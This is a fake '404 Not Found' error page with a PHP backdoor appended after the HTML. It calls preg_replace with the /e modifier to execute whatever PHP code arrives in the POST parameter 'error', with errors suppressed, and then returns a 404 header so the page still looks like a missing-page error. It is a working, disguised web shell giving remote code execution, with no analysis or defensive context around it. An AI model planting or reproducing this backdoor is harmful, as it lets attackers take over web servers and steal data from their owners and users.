<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
<?php
@preg_replace("/[pageerror]/e",$_POST['error'],"saft");
header('HTTP/1.1 404 Not Found');
?>